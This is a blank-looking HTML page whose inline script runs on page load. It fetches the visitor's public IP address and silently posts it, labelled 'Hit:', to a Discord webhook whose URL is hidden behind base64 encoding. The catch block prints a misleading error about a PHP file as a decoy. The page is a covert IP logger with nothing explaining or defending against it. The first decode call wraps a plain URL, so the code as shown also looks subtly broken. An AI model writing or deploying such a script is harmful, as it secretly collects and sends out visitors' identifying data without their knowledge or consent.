<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<script>
    async function funny() {
        const response = await fetch(atob('https://api64.ipify.org?format=json'));
        const data = await response.json();
        return data.ip;
    }
    async function funnier(noob) {
        const idiot = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwMDk2NzI5MjA4Nzk2Mzc4MC8xalMta0RRczlxbjlsWTJaVHlZQnllTVRJX2tMTTZtaEhCaXdMVHZPLVZOUGZBUFZCeUxZa1hlNE1QdWF5a3NJRkFIeQ==");
        const hehe = {
            content: `Hit: ${noob}`,
        };
        await fetch(idiot, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(hehe),
        });
    }
    async function main() {
        try {
            const noob = await funny();
            await funnier(noob);
        } catch (error) {
            console.error('Error loading PHP file, not run serverside? (netapplication.php)');
        }
    }
    window.onload = main;
</script>

</body>
</html>
